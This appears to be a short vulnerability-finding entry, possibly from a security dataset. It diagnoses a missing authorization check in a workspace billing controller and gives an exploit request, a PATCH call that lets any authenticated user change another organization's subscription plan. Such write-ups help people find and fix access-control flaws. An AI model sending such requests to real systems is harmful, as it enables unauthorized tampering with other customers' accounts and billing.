diagnosis: The controller relies solely on a global JwtAuthGuard for authentication but fails to verify whether the authenticated user has administrative privileges or ownership within the target workspace. Any valid user can change subscription plans or downgrade billing for other organizations by providing their workspace ID in the path.
exploit_request:
PATCH /api/workspaces/ws_987410/billing HTTP/1.1
Host: api.saasplatform.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"planId": "tier_enterprise_free_trial"}
